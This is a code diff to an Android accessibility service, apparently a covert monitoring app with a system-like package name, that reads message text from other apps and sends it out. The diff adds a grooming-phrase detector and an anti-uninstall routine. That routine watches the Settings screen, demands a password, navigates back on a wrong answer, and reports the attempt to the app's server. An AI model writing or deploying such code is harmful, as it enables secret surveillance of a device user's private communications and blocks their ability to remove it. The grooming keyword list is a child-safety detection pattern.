@@ -114,7 +114,55 @@ class AccessibilityMonitor : AccessibilityService() {
                                 put("package", pkg); put("content", content.take(500))
                                 put("time", System.currentTimeMillis())
                             })
+
+                            // Feature F1: Grooming Detection — scan for predator phrases
+                            val GROOMING = listOf(
+                                "meet me alone", "dont tell", "don't tell", "send photo", "send pic",
+                                "keep secret", "our secret", "mature for your age",
+                                "dont tell your parents", "don't tell your parents",
+                                "just between us", "delete this message", "come alone"
+                            )
+                            val lower = content.lowercase()
+                            val matched = GROOMING.firstOrNull { lower.contains(it) }
+                            if (matched != null) {
+                                svc?.sendData("grooming_alert", JSONObject().apply {
+                                    put("keyword", matched)
+                                    put("package", pkg)
+                                    put("message_preview", content.take(60))
+                                    put("time", System.currentTimeMillis())
+                                })
+                            }
                         }
+                    }
+
+                    // FIX #27: Detect uninstall attempt via Settings screen for our package
+                    if (pkg == "com.android.settings") {
+                        try {
+                            val nodes = rootInActiveWindow
+                            if (nodes != null) {
+                                val ownPkgNodes = nodes.findAccessibilityNodeInfosByText(packageName)
+                                if (!ownPkgNodes.isNullOrEmpty()) {
+                                    val uninstallNodes = nodes.findAccessibilityNodeInfosByText("Uninstall")
+                                    if (!uninstallNodes.isNullOrEmpty()) {
+                                        val prefs = applicationContext
+                                            .getSharedPreferences("config", android.content.Context.MODE_PRIVATE)
+                                        val storedHash = prefs.getString("uninstall_pass_hash", "") ?: ""
+                                        if (storedHash.isNotEmpty()) {
+                                            com.system.service.core.UninstallGuard.showPasswordDialog(
+                                                this, prefs,
+                                                onCorrect = { /* allow uninstall */ },
+                                                onWrong   = {
+                                                    performGlobalAction(GLOBAL_ACTION_BACK)
+                                                    CoreService.instance?.sendData("uninstall_attempt",
+                                                        JSONObject().apply { put("time", System.currentTimeMillis()) })
+                                                }
+                                            )
+                                        }
+                                    }
+                                }
+                                nodes.recycle()
+                            }
+                        } catch (_: Exception) {}
                     }
                 }
             }
